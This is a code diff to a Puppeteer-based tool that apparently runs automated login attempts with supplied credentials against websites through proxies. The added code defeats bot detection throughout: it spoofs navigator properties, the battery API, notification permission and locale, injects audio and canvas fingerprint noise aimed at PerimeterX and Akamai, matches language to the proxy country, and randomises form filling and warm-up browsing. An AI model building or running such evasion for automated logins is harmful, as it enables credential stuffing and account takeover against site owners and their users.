@@ -186,16 +186,43 @@ async function humanSubmit(page, selector, passSelector) {
 }
 `;
 
+// Country → realistic [primary, fallback] navigator.languages tuple. Used
+// by buildStealthInit to keep Intl, Accept-Language and navigator.languages
+// in lockstep with the proxy IP (improvement #8).
+const COUNTRY_LANGS = {
+  au: ['en-AU', 'en'], us: ['en-US', 'en'], gb: ['en-GB', 'en'],
+  ca: ['en-CA', 'en'], de: ['de-DE', 'de', 'en'], fr: ['fr-FR', 'fr', 'en'],
+  nl: ['nl-NL', 'nl', 'en'], sg: ['en-SG', 'en'], jp: ['ja-JP', 'ja', 'en'],
+  nz: ['en-NZ', 'en'], ie: ['en-IE', 'en'], es: ['es-ES', 'es', 'en'],
+};
+
 // Stealth init script — runs in EVERY new document before any site script.
 // Patches navigator.webdriver, plugins, languages, hardwareConcurrency,
-// deviceMemory, permissions.query, WebGL renderer (#2, #3), and adds tiny
-// canvas-pixel noise so fingerprint hashes vary per session.
-const STEALTH_INIT = `
+// deviceMemory, permissions.query, WebGL renderer, canvas/audio noise,
+// battery API, notification permission, and DateTimeFormat locale so the
+// fingerprint surface is consistent and country-aligned.
+function buildStealthInit(countryCode) {
+  const cc = (countryCode || 'au').toLowerCase();
+  const langs = COUNTRY_LANGS[cc] || COUNTRY_LANGS.au;
+  const primaryLocale = langs[0];
+  // Per-session randomised values so two sessions on the same proxy don't
+  // share an exact fingerprint.
+  const battery = {
+    charging: Math.random() < 0.55,
+    level: Math.round((0.3 + Math.random() * 0.65) * 100) / 100,
+    chargingTime: Math.random() < 0.5 ? Infinity : Math.floor(900 + Math.random() * 5400),
+    dischargingTime: Math.floor(3000 + Math.random() * 12000),
+  };
+  // Notification.permission: real users overwhelmingly sit on 'default',
+  // a meaningful minority on 'denied'. 'granted' is rare for fresh tabs.
+  const notifPerm = Math.random() < 0.78 ? 'default' : 'denied';
+  return `
 (() => {
   try {
     // #3 navigator hardening
     Object.defineProperty(Navigator.prototype, 'webdriver', { get: () => undefined });
-    Object.defineProperty(Navigator.prototype, 'languages', { get: () => ['en-AU', 'en'] });
+    Object.defineProperty(Navigator.prototype, 'languages', { get: () => ${JSON.stringify(langs)} });
+    Object.defineProperty(Navigator.prototype, 'language', { get: () => ${JSON.stringify(primaryLocale)} });
     Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { get: () => 8 });
     Object.defineProperty(Navigator.prototype, 'deviceMemory', { get: () => 8 });
     Object.defineProperty(Navigator.prototype, 'platform', { get: () => 'Linux x86_64' });
@@ -213,9 +240,44 @@ const STEALTH_INIT = `
     if (navigator.permissions && navigator.permissions.query) {
       const orig = navigator.permissions.query.bind(navigator.permissions);
       navigator.permissions.query = (p) => p && p.name === 'notifications'
-        ? Promise.resolve({ state: Notification.permission, onchange: null })
+        ? Promise.resolve({ state: ${JSON.stringify(notifPerm)}, onchange: null })
         : orig(p);
     }
+
+    // Realistic Notification.permission — randomised default vs denied (#9)
+    try {
+      Object.defineProperty(Notification, 'permission', { get: () => ${JSON.stringify(notifPerm)} });
+    } catch (_) {}
+
+    // Battery API spoof — Headless returns null; real Chrome resolves to a
+    // BatteryManager. Match charging/level/times to plausible defaults (#7).
+    try {
+      const battery = ${JSON.stringify(battery)};
+      battery.chargingTime = ${battery.chargingTime === Infinity ? 'Infinity' : battery.chargingTime};
+      const fakeBat = {
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime,
+        level: battery.level,
+        addEventListener: () => {},
+        removeEventListener: () => {},
+        dispatchEvent: () => true,
+        onchargingchange: null, onchargingtimechange: null,
+        ondischargingtimechange: null, onlevelchange: null,
+      };
+      Navigator.prototype.getBattery = function () { return Promise.resolve(fakeBat); };
+    } catch (_) {}
+
+    // Intl locale alignment — DTF locale must match navigator.language (#8)
+    try {
+      const _DTF = Intl.DateTimeFormat;
+      const _resolved = _DTF.prototype.resolvedOptions;
+      _DTF.prototype.resolvedOptions = function () {
+        const r = _resolved.call(this);
+        if (!r.locale || r.locale === 'en-US') r.locale = ${JSON.stringify(primaryLocale)};
+        return r;
+      };
+    } catch (_) {}
 
     // window.chrome shim — many bot detectors check for this
     if (!window.chrome) window.chrome = { runtime: {} };
@@ -251,29 +313,158 @@ const STEALTH_INIT = `
       } catch (_) {}
       return toDataURL.apply(this, args);
     };
+
+    // Audio fingerprint noise — PerimeterX/Akamai BMP hash buffer samples.
+    // Add ±1e-7 jitter to one in ~5000 samples so the hash differs per
+    // session without affecting actual playback (#6).
+    try {
+      const bufProto = (window.AudioBuffer || (window.OfflineAudioContext && OfflineAudioContext.prototype && OfflineAudioContext.prototype.createBuffer && Object.getPrototypeOf(new OfflineAudioContext(1, 1, 44100).createBuffer(1, 1, 44100))));
+      if (bufProto && bufProto.getChannelData) {
+        const orig = bufProto.getChannelData;
+        bufProto.getChannelData = function (ch) {
+          const data = orig.call(this, ch);
+          if (!data._n) {
+            for (let i = 0; i < data.length; i += 5000) {
+              data[i] = data[i] + (Math.random() - 0.5) * 1e-7;
+            }
+            try { Object.defineProperty(data, '_n', { value: 1 }); } catch (_) {}
+          }
+          return data;
+        };
+      }
+      if (window.AnalyserNode && AnalyserNode.prototype.getFloatFrequencyData) {
+        const origF = AnalyserNode.prototype.getFloatFrequencyData;
+        AnalyserNode.prototype.getFloatFrequencyData = function (arr) {
+          origF.call(this, arr);
+          for (let i = 0; i < arr.length; i += 1000) arr[i] = arr[i] + (Math.random() - 0.5) * 0.1;
+        };
+      }
+    } catch (_) {}
   } catch (_) {}
 })();
 `;
+}
+const STEALTH_INIT = buildStealthInit('au'); // backward-compat — overridden per call
 
 // Apply all stealth profile bits to a page. Idempotent — safe to call once
 // per page right after browser.newPage()/start of remote function. This is
 // itself a *source string* that gets appended to HUMANIZE_PRELUDE so it's
 // available verbatim inside the Browserless remote payload.
+//
+// The string contains both the static lookup tables and a closure-captured
+// build of STEALTH_INIT for the target country, so navigator.languages,
+// Accept-Language, Intl locale and timezone all stay in lockstep (#8).
 const APPLY_STEALTH_FN = `
 const COUNTRY_TZ = ${JSON.stringify(COUNTRY_TZ)};
+const COUNTRY_LANGS = ${JSON.stringify(COUNTRY_LANGS)};
 const VIEWPORT_POOL = ${JSON.stringify(VIEWPORT_POOL)};
-const STEALTH_INIT_SRC = ${JSON.stringify(STEALTH_INIT)};
+${buildStealthInit.toString()}
 async function applyStealth(page, countryCode) {
-  const tz = COUNTRY_TZ[(countryCode || 'au').toLowerCase()] || 'Australia/Sydney';
+  const cc = (countryCode || 'au').toLowerCase();
+  const tz = COUNTRY_TZ[cc] || 'Australia/Sydney';
+  const langs = COUNTRY_LANGS[cc] || COUNTRY_LANGS.au;
+  const acceptLang = langs[0] + ',' + (langs[1] || 'en') + ';q=0.9';
   const vp = VIEWPORT_POOL[Math.floor(Math.random() * VIEWPORT_POOL.length)];
   try { await page.setUserAgent(CHROME_UA); } catch (_) {}
-  try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' }); } catch (_) {}
+  try { await page.setExtraHTTPHeaders({ 'Accept-Language': acceptLang }); } catch (_) {}
   try { await page.setViewport({ width: vp.w, height: vp.h, deviceScaleFactor: vp.dpr }); } catch (_) {}
   // #4 timezone — align Intl with proxy country
   try { await page.emulateTimezone(tz); } catch (_) {}
-  // #3 #2 navigator + GPU + canvas shims, before any page script.
-  // Pass the source as a string so it runs as-is (an IIFE) on every doc.
-  try { await page.evaluateOnNewDocument(STEALTH_INIT_SRC); } catch (_) {}
+  // Build country-aware init script (locale, langs, battery, audio)
+  const initSrc = buildStealthInit(cc);
+  try { await page.evaluateOnNewDocument(initSrc); } catch (_) {}
+  return { acceptLang, langs };
+}
+
+// Resource-blocking — drop fonts, analytics and known 3rd-party trackers
+// on the login page. Cuts 30-60 requests typically (#3). Idempotent: only
+// installs once per page even if called twice in a session.
+const TRACKER_HOSTS = [
+  'google-analytics.com', 'googletagmanager.com', 'doubleclick.net',
+  'facebook.net', 'connect.facebook.net', 'hotjar.com', 'segment.com',
+  'fullstory.com', 'mixpanel.com', 'amplitude.com', 'newrelic.com',
+  'optimizely.com', 'cloudflareinsights.com', 'snapchat.com', 'tiktok.com',
+];
+async function installResourceBlocker(page) {
+  if (page.__rb) return;
+  page.__rb = true;
+  try {
+    await page.setRequestInterception(true);
+    page.on('request', (req) => {
+      try {
+        const t = req.resourceType();
+        const u = req.url();
+        if (t === 'font' || t === 'media') return req.abort();
+        if (t === 'image' && /\\.(gif|svg)(\\?|$)/i.test(u) && /pixel|track|beacon/i.test(u)) return req.abort();
+        for (let i = 0; i < TRACKER_HOSTS.length; i++) {
+          if (u.includes(TRACKER_HOSTS[i])) return req.abort();
+        }
+        return req.continue();
+      } catch (_) { try { req.continue(); } catch (_) {} }
+    });
+  } catch (_) {}
+}
+
+// Tighter post-submit wait. Resolves on whichever fires first:
+//  - main-frame navigation (domcontentloaded), or
+//  - any of the success/error selectors becoming visible, or
+//  - a hard 4s ceiling (median real logins are <2s post-submit).
+// Avoids the legacy 15s networkidle2 budget (#5).
+async function waitPostSubmit(page, opts) {
+  const { successSel, errorTextHints, ceiling = 4000 } = opts || {};
+  const navP = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: ceiling }).catch(() => 'nav');
+  const selP = successSel
+    ? page.waitForSelector(successSel, { visible: true, timeout: ceiling }).then(() => 'sel').catch(() => null)
+    : null;
+  const errP = page.waitForFunction(
+    (hints) => {
+      const t = (document.body && document.body.innerText || '').toLowerCase();
+      for (let i = 0; i < hints.length; i++) if (t.includes(hints[i])) return true;
+      return false;
+    },
+    { timeout: ceiling, polling: 200 },
+    errorTextHints || ['incorrect', 'invalid', 'wrong', 'disabled']
+  ).then(() => 'err').catch(() => null);
+  const racers = [navP];
+  if (selP) racers.push(selP);
+  if (errP) racers.push(errP);
+  racers.push(new Promise((r) => setTimeout(() => r('ceiling'), ceiling)));
+  return Promise.race(racers);
+}
+
+// Form-fill order randomisation — ~15% of real users tab from password →
+// username (autofill quirks). Otherwise username first (#10).
+async function humanFillForm(page, userSel, passSel, username, password) {
+  if (Math.random() < 0.15) {
+    await humanType(page, passSel, password);
+    await sleep(rand(180, 520));
+    await humanType(page, userSel, username);
+  } else {
+    await humanType(page, userSel, username);
+    await sleep(rand(220, 620));
+    await humanType(page, passSel, password);
+  }
+}
+
+// Parallel pre-flight — open a second tab and run the warm-up hop while
+// the main tab is already navigating to the login page. Saves the full
+// dwell from the critical path (#2).
+async function parallelPreFlight(browserOrContext, paths, minMs, maxMs) {
+  if (!Array.isArray(paths) || paths.length === 0) return null;
+  const url = paths[rand(0, paths.length - 1)];
+  let warmPage = null;
+  try {
+    warmPage = await browserOrContext.newPage();
+    try { await warmPage.setExtraHTTPHeaders({ 'Referer': 'https://www.google.com/' }); } catch (_) {}
+    try { await warmPage.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) {}
+    const dwell = rand(Math.max(500, minMs || 3500), Math.max(1500, maxMs || 8000));
+    const start = Date.now();
+    while (Date.now() - start < dwell) {
+      await warmPage.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300)).catch(() => {});
+      await sleep(rand(700, 1800));
+    }
+  } catch (_) {}
+  return warmPage;
 }
 `;
 
@@ -618,8 +809,14 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         const preFlightMax = ${JSON.stringify(site.pre_flight_max_ms || 8000)};
         const country = ${JSON.stringify(proxy.country_code || 'au')};
 
-        // #1 #2 #3 #4 — viewport pool, timezone, navigator/WebGL/canvas shims
+        // Stealth profile (viewport, timezone, navigator/WebGL/canvas/audio/
+        // battery/locale shims) — country-aware so Accept-Language, langs
+        // and Intl all match the proxy IP.
         await applyStealth(page, country);
+
+        // Resource blocker — drop fonts/analytics/trackers on the login
+        // page (#3). Saves 1-3s per attempt.
+        await installResourceBlocker(page);
 
         const started = Date.now();
         const screenshots = [];
@@ -638,12 +835,18 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         pollScreenshots();
 
         try {
-          // Pre-flight: visit a neutral page (FAQ / blog / homepage) and
-          // dwell with light scrolling before navigating to /login.
-          await preFlight(page, preFlightPaths, preFlightMin, preFlightMax);
+          // Parallel pre-flight (#2) — warm cookies in a second tab while
+          // the main tab is already navigating to /login.
+          const browser = page.browser();
+          const warmP = parallelPreFlight(browser, preFlightPaths, preFlightMin, preFlightMax);
 
           await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => {});
           await page.waitForSelector(userSel, { visible: true, timeout: 30000 }).catch(() => {});
+
+          // Make sure the warm-up hop is done before we submit credentials,
+          // so the first-party cookies it set are present. Then close it.
+          try { const wp = await warmP; if (wp) await wp.close().catch(() => {}); } catch (_) {}
+
           // #5 #7 — idle drift + edge-entry mouse trajectory before focus
           await loginPageIdle(page);
           await sleep(rand(800, 1800));
@@ -661,17 +864,19 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
             await page.keyboard.press('Delete');
             await sleep(rand(120, 300));
 
-            await humanType(page, userSel, email);
-            await sleep(rand(220, 620));
-            await humanType(page, passSel, pw);
+            // Randomised fill order (#10): mostly user→pass, ~15% pass→user.
+            await humanFillForm(page, userSel, passSel, email, pw);
             await sleep(rand(380, 1100));
 
+            // Tighter post-submit wait (#5): race nav / error-text / 4s.
             await Promise.all([
-              page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-              humanSubmit(page, submitSel, passSel)  // #8 — sometimes Enter, sometimes click
+              waitPostSubmit(page, { ceiling: 4500 }),
+              humanSubmit(page, submitSel, passSel)
             ]);
 
-            await sleep(jitter(i === 0 ? 6000 : 6300));
+            // Short stabilisation pause — most decisions land within ~1.2s
+            // after navigation completes; previous 6s was conservative.
+            await sleep(jitter(1500));
 
             const text = await page.evaluate(() => document.body.innerText);
             const lowerText = text.toLowerCase();
@@ -775,17 +980,43 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         const _jitter = (ms) => Math.max(0, Math.round(ms + (Math.random() * 2 - 1) * ms * 0.3));
         const _sleep = (ms) => new Promise(r => setTimeout(r, _jitter(ms)));
 
-        // #1 #2 #3 #4 — viewport pool, timezone aligned to proxy country,
-        // navigator hardening, WebGL/canvas spoofing. Runs before the page
-        // ever sees a script.
+        // Stealth profile — country-aware (timezone + Accept-Language +
+        // navigator.languages + Intl locale + battery + audio + canvas +
+        // WebGL all kept in lockstep with the proxy IP).
         const _country = (proxy.country_code || 'au').toLowerCase();
         const _tz = COUNTRY_TZ[_country] || 'Australia/Sydney';
+        const _langs = COUNTRY_LANGS[_country] || COUNTRY_LANGS.au;
+        const _acceptLang = _langs[0] + ',' + (_langs[1] || 'en') + ';q=0.9';
         const _vp = VIEWPORT_POOL[_rand(0, VIEWPORT_POOL.length - 1)];
         await page.setUserAgent(CHROME_UA);
-        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
+        await page.setExtraHTTPHeaders({ 'Accept-Language': _acceptLang });
         try { await page.setViewport({ width: _vp.w, height: _vp.h, deviceScaleFactor: _vp.dpr }); } catch (_) {}
         try { await page.emulateTimezone(_tz); } catch (_) {}
-        try { await page.evaluateOnNewDocument(STEALTH_INIT); } catch (_) {}
+        try { await page.evaluateOnNewDocument(buildStealthInit(_country)); } catch (_) {}
+
+        // Resource blocker — drop fonts/analytics/trackers on the login
+        // page (#3). Idempotent within the page.
+        const _trackerHosts = ['google-analytics.com','googletagmanager.com','doubleclick.net','facebook.net','connect.facebook.net','hotjar.com','segment.com','fullstory.com','mixpanel.com','amplitude.com','newrelic.com','optimizely.com','cloudflareinsights.com','snapchat.com','tiktok.com'];
+        const _installResourceBlocker = async (p) => {
+          if (p.__rb) return;
+          p.__rb = true;
+          try {
+            await p.setRequestInterception(true);
+            p.on('request', (req) => {
+              try {
+                const t = req.resourceType();
+                const u = req.url();
+                if (t === 'font' || t === 'media') return req.abort();
+                if (t === 'image' && /\.(gif|svg)(\?|$)/i.test(u) && /pixel|track|beacon/i.test(u)) return req.abort();
+                for (let i = 0; i < _trackerHosts.length; i++) {
+                  if (u.includes(_trackerHosts[i])) return req.abort();
+                }
+                return req.continue();
+              } catch (_) { try { req.continue(); } catch (_) {} }
+            });
+          } catch (_) {}
+        };
+        await _installResourceBlocker(page);
 
         const _dispatchPointer = (sel) => page.evaluate((s) => {
           const el = document.querySelector(s);
@@ -854,20 +1085,54 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           }
         };
 
-        const _preFlight = async () => {
+        // Parallel pre-flight (#2) — open a second tab in the same browser
+        // session, warm cookies + dwell while the main tab navigates to
+        // /login. Returns the warm page so we can close it later.
+        const _parallelPreFlight = async () => {
           const paths = site.pre_flight_paths || [];
-          if (paths.length === 0) return;
+          if (paths.length === 0) return null;
           const url = paths[_rand(0, paths.length - 1)];
-          // #6 — Google referer on the warm-up hop
-          try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9', 'Referer': 'https://www.google.com/' }); } catch (_) {}
-          try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) { return; }
-          const dwell = _rand(Math.max(500, site.pre_flight_min_ms || 3500), Math.max(1500, site.pre_flight_max_ms || 8000));
-          const start = Date.now();
-          while (Date.now() - start < dwell) {
-            await page.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300));
-            await _sleep(_rand(700, 1800));
+          let warm = null;
+          try {
+            warm = await browser.newPage();
+            try { await warm.setExtraHTTPHeaders({ 'Referer': 'https://www.google.com/' }); } catch (_) {}
+            try { await warm.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) {}
+            const dwell = _rand(Math.max(500, site.pre_flight_min_ms || 3500), Math.max(1500, site.pre_flight_max_ms || 8000));
+            const start = Date.now();
+            while (Date.now() - start < dwell) {
+              await warm.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300)).catch(() => {});
+              await _sleep(_rand(700, 1800));
+            }
+          } catch (_) {}
+          return warm;
+        };
+
+        // Tighter post-submit wait (#5) — race nav / error-text / ceiling.
+        const _waitPostSubmit = async (ceiling) => {
+          const cap = ceiling || 4500;
+          const navP = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: cap }).catch(() => 'nav');
+          const errP = page.waitForFunction(
+            () => {
+              const t = (document.body && document.body.innerText || '').toLowerCase();
+              return t.includes('incorrect') || t.includes('invalid') || t.includes('wrong') || t.includes('disabled');
+            },
+            { timeout: cap, polling: 200 }
+          ).then(() => 'err').catch(() => null);
+          const ceilP = new Promise((r) => setTimeout(() => r('ceiling'), cap));
+          return Promise.race([navP, errP, ceilP]);
+        };
+
+        // Form-fill order randomisation (#10).
+        const _humanFillForm = async (u, p) => {
+          if (Math.random() < 0.15) {
+            await _humanType(passSel, p);
+            await _sleep(_rand(180, 520));
+            await _humanType(userSel, u);
+          } else {
+            await _humanType(userSel, u);
+            await _sleep(_rand(220, 620));
+            await _humanType(passSel, p);
           }
-          try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' }); } catch (_) {}
         };
 
         // #5 #7 — idle drift on the login page itself, mouse enters from edge
@@ -900,13 +1165,17 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           }
         };
 
-        await _preFlight();
+        // Kick off pre-flight in a separate tab and immediately start the
+        // main /login navigation in parallel (#2).
+        const _warmP = _parallelPreFlight();
         await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => {});
         try {
           await page.waitForSelector(userSel, { visible: true, timeout: 30000 });
         } catch (_) {
           // Ignore, we will try to type anyway if available
         }
+        // Make sure pre-flight finishes before we submit, then close it.
+        try { const wp = await _warmP; if (wp) await wp.close().catch(() => {}); } catch (_) {}
         await _loginPageIdle();
         await _sleep(_rand(800, 1800));
 
@@ -923,18 +1192,18 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           await page.keyboard.press('Delete');
           await _sleep(_rand(120, 300));
 
-          await _humanType(userSel, username);
-          await _sleep(_rand(220, 620));
-          await _humanType(passSel, pw);
+          // Randomised fill order (#10): mostly user→pass, ~15% pass→user.
+          await _humanFillForm(username, pw);
           await _sleep(_rand(380, 1100));
 
+          // Tighter post-submit wait (#5) — race nav / error-text / 4.5s.
           await Promise.all([
-            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
+            _waitPostSubmit(4500),
             _humanSubmit()
           ]);
 
-          // Randomised dwell after submit (±30%).
-          await _sleep(4000);
+          // Short stabilisation pause; previous 4s was conservative.
+          await _sleep(1500);
           
           const text = await page.evaluate(() => document.body.innerText.toLowerCase());
           if (text.includes('cloudflare') || text.includes('just a moment') || text.includes('access denied') || text.includes('security check')) {
